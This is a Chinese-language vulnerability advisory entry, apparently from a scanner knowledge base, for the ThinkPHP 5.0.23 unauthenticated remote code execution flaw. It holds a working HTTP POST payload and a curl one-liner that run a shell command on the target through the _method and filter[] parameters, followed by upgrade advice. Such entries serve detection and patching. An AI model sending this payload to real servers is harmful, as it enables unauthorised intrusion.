---
id: THINKPHP-5.0.23-RCE
title: ThinkPHP5 5.0.23 远程代码执行漏洞
product: thinkphp
vendor: ThinkPHP
version_affected: "<= 5.0.23"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["ThinkPHP", "ThinkPHP 5.x"]
---

## 漏洞描述

ThinkPHP 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。

## 影响版本

- ThinkPHP <= 5.0.23

## 前置条件

- 无需认证
- 目标使用 ThinkPHP 5.x

## 利用步骤

1. 利用 `_method` 参数调用构造函数
2. 通过 `filter[]` 和 `server[REQUEST_METHOD]` 执行命令

## Payload

```http
POST /index.php?s=captcha HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

## 验证方法

```bash
# 检查命令执行结果
curl -s -X POST "http://target:8080/index.php?s=captcha" -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" | grep uid
```

## 修复建议

1. 升级 ThinkPHP 至 5.0.24+
2. 升级到最新版本的 ThinkPHP
3. 对请求方法进行严格验证
